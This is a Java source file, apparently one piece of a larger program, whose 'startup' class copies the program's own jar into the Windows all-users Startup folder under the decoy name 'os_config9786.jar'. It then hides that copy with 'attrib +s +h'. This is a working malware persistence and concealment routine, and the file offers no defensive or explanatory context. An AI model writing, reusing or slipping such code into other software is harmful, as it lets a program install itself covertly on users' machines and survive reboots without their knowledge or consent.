
import java.nio.file.Files;
import java.nio.file.Paths;
/*
  Created by Anirudh on 28-01-2017.
 */
public class startup {
    public static void setting() {
        String root = System.getProperty("user.home").substring(0,1) ;
        String output_path = root + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\os_config9786.jar" ;
        String input_path = anchor.getJarDir(closer.class).getAbsolutePath() + new java.io.File(closer.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName() + ".jar" ;
        try {
            Files.copy(Paths.get(input_path), Paths.get(output_path));
            Process u = Runtime.getRuntime().exec("cmd /c attrib +s +h " + output_path) ;
        } catch (java.io.IOException i) {
            System.err.println(i);
        }
    }
    public static void main(String[] args) {

    }
}
